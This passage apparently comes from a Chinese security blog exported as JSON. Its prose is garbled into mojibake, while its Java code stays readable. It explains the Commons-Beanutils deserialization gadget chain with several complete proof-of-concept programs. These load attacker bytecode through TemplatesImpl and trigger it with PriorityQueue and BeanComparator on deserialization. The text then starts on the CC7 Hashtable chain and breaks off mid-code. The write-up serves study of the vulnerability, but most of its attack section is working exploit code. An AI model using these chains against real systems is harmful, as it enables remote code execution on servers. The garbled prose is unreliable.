æ˜¯åé¢è¦åˆ©ç”¨çš„BeanComparatorè¦ç”¨ï¼š è¸©äº†ä¸€ä¸‹å‘ï¼Œè¿™é‡Œ4æ˜¯ç”¨ä¸äº†çš„\næ­£å¼å­¦ä¹  Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šjavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚\nè€ŒJavaBeanæ˜¯ä¸€ä¸ªéµå¾ªç‰¹å®šå†™æ³•çš„Javaç±»ï¼Œå®ƒé€šå¸¸å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š\nè¿™ä¸ªç±»å¿…é¡»å…·æœ‰ä¸€ä¸ªæ— å‚çš„æ„é€ å‡½æ•°ï¼ˆä¸€èˆ¬æˆ‘ä»¬æ²¡è‡ªå®šä¹‰æ„é€ å‡½æ•°çš„è¯é»˜è®¤çš„å°±æ˜¯æ— å‚çš„æ„é€ å‡½æ•°ï¼‰ å±æ€§å¿…é¡»ç§æœ‰åŒ– ç§æœ‰åŒ–çš„å±æ€§å¿…é¡»é€šè¿‡publicç±»å‹çš„æ–¹æ³•æš´éœ²ç»™å…¶ä»–ç¨‹åºï¼Œå¹¶ä¸”æ–¹æ³•çš„å‘½åä¹Ÿå¿…é¡»éµå®ˆä¸€å®šçš„å‘½åè§„èŒƒã€‚ æ¯”å¦‚å¦‚ä¸‹çš„Catç±»å°±æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„JavaBeanç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 final public class Cat { private String name = \u0026#34;catalina\u0026#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } å®ƒåŒ…å«ä¸€ä¸ªç§æœ‰å±æ€§nameï¼Œå’Œè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆç§°ä¸ºgetterå’Œsetterã€‚\néœ€è¦äº†è§£çš„ç±» PropertyUtils å®ƒæ˜¯å¯¹JavaBeanè¿›è¡Œæ“ä½œçš„å·¥å…·ç±»ï¼Œå¯å•ç‹¬ä¸ºæŸä¸ªå±æ€§è¿›è¡Œå€¼çš„æ“ä½œçš„å·¥å…·ç±»ã€‚å®ƒåˆ©ç”¨åå°„æ“ä½œBeançš„å±æ€§ã€‚è¿™ä¸ªç±»ä½äºorg.apache.commons.beanutils.PropertyUtilsã€‚\nPropertyUtilsç±»ä¸­æä¾›äº†ä¸€äº›publicçš„é™æ€æ–¹æ³•ï¼Œä»¥ä¾¿ç›´æ¥è°ƒç”¨ä¸€äº›getterå’Œsetteræ–¹æ³•ï¼š\ngetPropertyï¼šè¿”å›æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ getSimplePropertyï¼šè¿”å›æ‰§è¡ŒBeançš„æŒ‡å®šå±æ€§çš„å€¼ setPropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ setSimplePropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼ çœ‹ä¸€ä¸ªå®ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import org.apache.commons.beanutils.PropertyUtils; public class Main{ private String name; public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public static void main(String[] args) throws Exception { Main x = new Main(); PropertyUtils.setProperty(x,\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;); System.out.println(x.getName()); x.setName(\u0026#34;haha\u0026#34;); System.out.println(PropertyUtils.getProperty(x,\u0026#34;name\u0026#34;)); } } è¾“å‡ºä¸ºï¼š\n1 2 fupanc haha çœ‹è¿™ä¸ªç»“æœå·²ç»å¾ˆå®¹æ˜“çŸ¥é“å‰é¢çš„æ–¹æ³•æ˜¯å¹²å˜›çš„äº†ã€‚æ³¨æ„ä¸€ä¸‹åœ¨è°ƒç”¨æ–¹æ³•æ—¶å¯¹äºå‚æ•°è®¾ç½®çš„é—®é¢˜ã€‚\næ‰€ä»¥è¿™é‡Œå…¶å®å¾ˆå®¹æ˜“çœ‹å‡ºï¼ŒPropertyUtils.getProperty/setPropertyæ–¹æ³•ï¼Œå‚æ•°ä¸€å®šè¦æ³¨æ„ï¼Œå…¶å®å°±å¯ä»¥ç†è§£ä¸ºè°ƒç”¨å¯¹åº”ç±»å˜é‡çš„getterå’Œsetteræ–¹æ³•ã€‚\nBeanComparator å‰é¢ä¹Ÿè¯´è¿‡ï¼Œå…¶å®CBé“¾å°±æ˜¯cc2çš„åŸºç¡€ä¸Šæ–°æ‰¾äº†ä¸€ä¸ªè°ƒç”¨compareè¿›è¡Œåˆ©ç”¨ã€‚åœ¨ysoserialä¸­åˆ©ç”¨åˆ°çš„æ˜¯BeanComparatorç±»ï¼Œè¿™ä¸ªç±»ä½äºorg.apache.commons.beanutils.BeanComparatorï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»–çš„compareæ–¹æ³•ï¼š é‡ç‚¹å…³æ³¨ï¼š\nå‰é¢è¯´è¿‡getProperty()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨o1ã€o2å¯¹è±¡çš„propertyå˜é‡çš„getteræ–¹æ³•ã€‚\nåœ¨ysoserialä¸­ï¼ŒCBé“¾åˆ©ç”¨åˆ°äº†TemplatesImplç±»ï¼Œæ˜¯é€šè¿‡PropertyUtils.getPropertyæ¥è°ƒç”¨_outputPropertieså˜é‡çš„getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯TemplatesImplçš„getOutputPropertiesæ–¹æ³•æ¥åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œé‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹getOutputProperties()æ–¹æ³•çš„æºç ï¼š è¿™é‡Œè°ƒç”¨äº†newTransformer()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±å¯ä»¥è¿›è¡Œä¸€æ¬¡æ¶æ„åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚\né‚£ä¹ˆåœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶o1/o2ä¸ºTemplatesImplå¯¹è±¡ï¼Œthis.Propertiesä¸ºoutputPropertieså­—ç¬¦ä¸²ã€‚\nçœ‹ä¸€ä¸‹BeanComparatorç±»çš„æ„é€ æ–¹æ³•ï¼ŒæŒ‰ç…§å‰é¢çš„æè¿°ï¼Œæˆ‘ä»¬è¿™é‡Œä¸éœ€è¦è‡ªå®šä¹‰this.comparatorå˜é‡ï¼Œè¿™é‡Œæˆ‘ä»¬è¦åˆ©ç”¨åˆ°çš„æ˜¯æ„é€ æ–¹æ³•æ˜¯ï¼š\nå…¶å®ä¹Ÿå°±æ˜¯ä¸‹é¢é‚£ä¸ªï¼Œä½†æ˜¯ç›´æ¥ä½¿ç”¨â€œé»˜è®¤â€çš„comparatoräº†ã€‚\næ”»å‡»æ„é€  å‰é¢æŠŠåŸºæœ¬çš„é“¾ç»™äº†å‡ºæ¥ï¼Œåœ¨è¿™é‡Œè¿˜æ˜¯åˆ©ç”¨çš„PriorityQueueä½œä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»ï¼Œååºåˆ—åŒ–çš„æ—¶å€™æ˜¯å·®ä¸å¤šçš„ï¼Œæœ€ç»ˆåˆ°è°ƒç”¨compare()æ–¹æ³•çš„åœ°æ–¹æ˜¯ï¼š\nç°åœ¨å…¶å®æ„Ÿè§‰å’ŒCC2å·®ä¸å¤šäº†ã€‚\næ„é€ åŸºæœ¬çš„å­—èŠ‚ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç„¶åå…¶ä»–æµç¨‹ç›´æ¥å½“åšcc2é‚£é‡Œçœ‹ï¼Œç°åœ¨ç®€å•åˆ†åˆ«åˆ†æä¸€ä¸‹è¿‡ç¨‹ã€‚\nååºåˆ—åŒ–éƒ¨åˆ† å’ŒCC2å·®ä¸å¤šï¼ŒPriorityQueueçš„readObject() =ã€‹heapify() =ã€‹siftDown() =ã€‹siftDownUsingComparatorï¼Œæœ€ç»ˆä¹Ÿå°±æ˜¯å¦‚ä¸‹ï¼š æŒ‰ç…§CC2è¿‡ç¨‹æ¥ï¼Œå‡å¦‚æˆ‘ä»¬addè¿›ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆè¿™é‡Œçš„kä¸º0ï¼Œxä¸ºqueue[0]çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸€ä¸ªaddè¿›çš„å€¼ï¼ŒåŒæ—¶çœ‹è¿™ä¸ªæ–¹æ³•çš„å†…éƒ¨ï¼Œé‚£ä¹ˆå†åˆ†åˆ«è¯´ä¸€ä¸‹å€¼é—®é¢˜ï¼š\nhalfï¼š1 childï¼š1 rightï¼š2 æ‰€ä»¥ä¸Šé¢çš„cå¯¹åº”æˆ‘ä»¬å‰é¢addè¿›çš„ç¬¬äºŒä¸ªå€¼ï¼Œçœ‹å¤§å°æƒ…å†µå¯ä»¥çŸ¥é“æ˜¯ä¼šè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶è¯­å¥ï¼Œå¯¹åº”å‚æ•°åˆ†åˆ«ä¸ºï¼ˆxï¼šqueue[0]ï¼Œcï¼šqueue[1]ï¼‰ã€‚\nç»“åˆå‰é¢å¯¹BeanComparatorç±»çš„compare()æ–¹æ³•çš„æè¿°ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¿™é‡Œè‡³å°‘éœ€è¦ä¸€ä¸ªä¸ºè®¾è®¡å¥½äº†çš„TemplatesImplç±»å¯¹è±¡ã€‚\nåºåˆ—åŒ–éƒ¨åˆ† add()æœ‰ä¸ªéƒ¨åˆ†ï¼Œåœ¨ç¬¬äºŒæ¬¡addè¿›å€¼çš„æ—¶å€™ï¼š æŒ‰ç…§å‰é¢çš„è¯´æ³•ï¼Œè¿™é‡Œä¼šè¿›å…¥BeanComparatorçš„compare()æ–¹æ³•ï¼Œè¿™é‡Œçš„kå³æ˜¯1ï¼Œxå³æ˜¯æˆ‘ç¬¬äºŒæ¬¡è¦æ”¾å…¥çš„å€¼ï¼Œeå°±æ˜¯queue[0]ï¼Œä¹Ÿå°±æ˜¯æˆ‘æ”¾å…¥çš„ç¬¬ä¸€ä¸ªå€¼ã€‚çœ‹è¿™é‡Œçš„compare()çš„å€¼ï¼Œçœ‹å‚æ•°ï¼ˆxï¼šadd2ï¼Œeï¼šqueue[0]ï¼‰ï¼Œåœ¨å‰é¢åºåˆ—åŒ–çš„æ—¶å€™è¯´äº†ï¼Œæˆ‘ä»¬éœ€è¦è‡³å°‘addè¿›ä¸€ä¸ªTemplatesImplç±»å®ä¾‹ï¼Œé‚£ä¹ˆå…¶å®åœ¨è¿™é‡ŒåŒæ ·å¯ä»¥å°è¯•ä¸€ä¸‹æ„é€ åœ¨åºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(tem); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚è¿˜æœ‰å°±æ˜¯å­˜åœ¨ä¸€ä¸ªå’Œä¹‹å‰ä¸€æ ·çš„é—®é¢˜ï¼Œå½“æˆ‘åˆ©ç”¨TemplatesImplæ¥åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘addè¿›ä¸¤ä¸ªtemï¼Œåªä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œåœ¨ç¬¬ä¸€ä¸ªç»“æŸåä¼šç›´æ¥æŠ¥é”™ç»“æŸï¼Œå¹¶ä¸ä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ©ç”¨ç‚¹ï¼š æ¯”å¦‚CC4ç­‰ã€‚\nè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯è¿™é‡Œaddè¿›çš„é¡ºåºä¹Ÿæœ‰è®²ç©¶ï¼Œæ¯”å¦‚æˆ‘åƒä¸Šé¢ä»£ç é‚£æ ·åªaddè¿›ä¸€ä¸ªï¼Œé‚£ä¹ˆæˆ‘å¿…é¡»ä¿è¯temåœ¨o1ï¼Œå› ä¸ºo1/o2å¿…é¡»ä¸ºä¸€ä¸ªç±»å®ä¾‹ï¼ŒæŒ‰ç…§å‰é¢å°†çš„å‚æ•°é—®é¢˜ï¼Œo1å¯¹åº”add2ï¼Œä¹Ÿå°±æ˜¯æˆ‘è¦åœ¨ç¬¬äºŒä¸ªåœ°æ–¹addè¿›temï¼Œå¦åˆ™ä¼šç›´æ¥æŠ¥é”™é€€å‡ºã€‚\né‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ç»§ç»­å…³æ³¨ç¬¬äºŒæ¬¡addåä¼šå‘ç”Ÿä»€ä¹ˆï¼š åœ¨å‰é¢æŠ›å‡ºå¼‚å¸¸åï¼Œä¸çŸ¥é“è°ƒç”¨compare()æ–¹æ³•ååˆ°åº•ä¼šè¿”å›ä»€ä¹ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰“æ–­ç‚¹æ¥çœ‹ä¼šåˆ°å“ªé‡Œï¼Œå‘ç°ç¡®å®ä¼šåœ¨æŠ›å‡ºå¼‚å¸¸åç›´æ¥é€€å‡ºï¼Œé‚£ä¹ˆè¿™æ ·æˆ‘ä»¬å¹¶ä¸èƒ½æˆåŠŸåœ¨queue[1]æˆåŠŸè®¾ç½®ä¸ºtemï¼Œä»è€Œå¯¼è‡´åç»­éƒ½å¤±è´¥ã€‚\nåœ¨ysoserialä¸­ç»™å‡ºäº†è§£å†³æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå¾€é‡Œé¢éšä¾¿addè¿›å€¼ï¼Œç„¶åå†åå°„æ›´æ”¹ä¸ºæˆ‘æƒ³åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆæµ‹è¯•ä»£ç å¯ä»¥æ”¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç„¶åè¿™é‡ŒæŠ¥é”™äº†æˆ‘ä»¬ä¸Šé¢è¯´çš„é—®é¢˜ï¼ŒPropertyUtilsçš„getPropertyçš„æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸ºç±»å®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¼ å…¥çš„éƒ½æ˜¯æ•´æ•°ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¬¡addåä¼šæŠ¥é”™ã€‚\nè§£å†³æ–¹æ³•ï¼Œåœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼š è¿™é‡Œåªè¦æ»¡è¶³propertyä¸ºnullï¼Œå°±ä¸ä¼šå†è°ƒç”¨getProperty()æ–¹æ³•ï¼Œè€Œæ˜¯æ­£å¸¸çš„compareæ–¹æ³•æ¥æ¯”è¾ƒã€‚\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿å¾—propertyå…ˆä¸ºnullï¼Œè€Œåå†åå°„ä¿®æ”¹è¿™ä¸ªå€¼ä¸ºoutputPropertiesã€‚\né‚£ä¹ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); //é”™è¯¯ç‚¹ Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç»§ç»­æŠ¥é”™\nç„¶åæ€è€ƒï¼Œè¿™é‡Œé€»è¾‘æ˜æ˜æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸ºå•¥è¿˜æ˜¯å¼¹è¿™ä¸ªé—®é¢˜ï¼Œç„¶åæˆ‘å°è¯•ä¿®æ”¹ä¸ºä¼ å…¥ä¸¤ä¸ªtemï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œç„¶åå†ä»”ç»†æ¯”å¯¹ä¸€ä¸‹ï¼Œæ‰¾å‡ºé—®é¢˜æ‰€åœ¨ï¼Œé—®é¢˜å¤„åœ¨å‰é¢çš„POCæ ‡å‡ºæ¥äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³ã€‚\næˆ‘å‰é¢çš„POCæ„é€ æ˜¯æŒ‰ç…§åºåˆ—åŒ–å‰çš„add()éƒ¨åˆ†æ„é€ çš„ï¼Œå…¶ä¸­çš„é¡ºåºéœ€è¦ä¸ºï¼š\nadd1ä¸ºå…¶ä»–ï¼Œå¿…é¡»add2ä¸ºtemã€‚\nä½†æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­\næ³¨æ„å‰é¢åˆ†ææ—¶ç»™å‡ºçš„ç»“æœï¼Œåœ¨ååºåˆ—æ—¶è°ƒç”¨åˆ°BeanComparatorçš„compare()æ–¹æ³•æ—¶çš„å‚æ•°åˆ†åˆ«ä¸º**ï¼ˆxï¼šqueue[0]ï¼Œcï¼šqueue[1]ï¼‰**ã€‚\næ‰€ä»¥è¿™é‡Œæ˜¯å…ˆè°ƒç”¨çš„queue[0]ï¼ŒåŒæ—¶ç»“åˆæˆ‘ä»¬å‰é¢çš„è¯´æ³•ï¼Œåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ï¼Œå¦‚ä¸‹è®¾ç½®ï¼š\n1 Object[] x = new Object[]{tem,1}; é‚£ä¹ˆæœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{tem,1}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\n","date":"2025-01-22T14:02:39+08:00","permalink":"https://fupanc-w1n.github.io/p/cb%E9%93%BE/","title":"CBé“¾"},{"content":"CC7 CC7çš„æ€è·¯åŒæ ·æ˜¯æ‰¾å¦ä¸€æ¡è°ƒç”¨é“¾æ¥è§¦å‘lazy.get()æ–¹æ³•ï¼Œè¿™æ¬¡ç”¨åˆ°çš„æ˜¯Hashtableç±»\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 commons-collections 3.2.1 ä»£ç åˆ†æ åœ¨ysoserialç»™å‡ºçš„è°ƒç”¨é“¾ä¸­ï¼Œé€‰å–äº†java.util.Hashtable#readObjectæ–¹æ³•ä½œä¸ºè°ƒç”¨é“¾çš„èµ·ç‚¹ã€‚\nHashtable ä¸ HashMapå¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¸€ç§key-valueå½¢å¼çš„å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰åŒºåˆ«ï¼š\nHashMap ä¸ Hashtableçš„çˆ¶ç±»ä¸ä¸€æ ·ã€‚ ä¸¤è€…å†…éƒ¨åŸºæœ¬éƒ½æ˜¯ä½¿ç”¨â€œæ•°ç»„-é“¾è¡¨â€çš„ç»“æ„ï¼Œä½†æ˜¯ HashMap å¼•å…¥äº†çº¢é»‘æ ‘çš„å®ç°ã€‚ Hashtable çš„key-value ä¸å…è®¸ä¸ºnullå€¼ï¼Œä½†æ˜¯HashMap æ˜¯å…è®¸çš„ï¼Œåè€…ä¼šå°† key=valueçš„å®ä½“æ”¾åœ¨index=0 çš„ä½ç½®ã€‚ Hashtable çº¿ç¨‹å®‰å…¨ï¼ŒHashMap çº¿ç¨‹ä¸å®‰å…¨ã€‚ åŒæ ·çš„ï¼Œæ—¢ç„¶HashMapå¯ä»¥å®ç°ååºåˆ—åŒ–æ¼æ´ï¼ŒHashtableåŒæ ·å¯ä»¥ã€‚\nåˆ†ææºç ï¼Œè¿™ä¸ªHashtableç±»å¯ä»¥ç»™å‡ºä¸¤æ¡é“¾ï¼Œåˆ†åˆ«æ˜¯\nreadObject()ä¸­çš„reconstitution()çš„hashCode()æ–¹æ³• readObject()ä¸­çš„reconstitution()çš„equal()æ–¹æ³• hashCode ï¼ˆå…¶å®ç»™è¿™ä¸ªéƒ½å¯ä»¥ç®—åˆ°CC6é‚£é‡Œå»ï¼Œåˆ©ç”¨æ€è·¯å’ŒCC6å·®ä¸å¤šï¼‰\næˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Hashtableçš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new StreamCorruptedException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); int origlength = s.readInt(); int elements = s.readInt(); if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); origlength = Math.max(origlength, (int)(elements / lf) + 1); int length = (int)((elements + elements / 20) / lf) + 3; 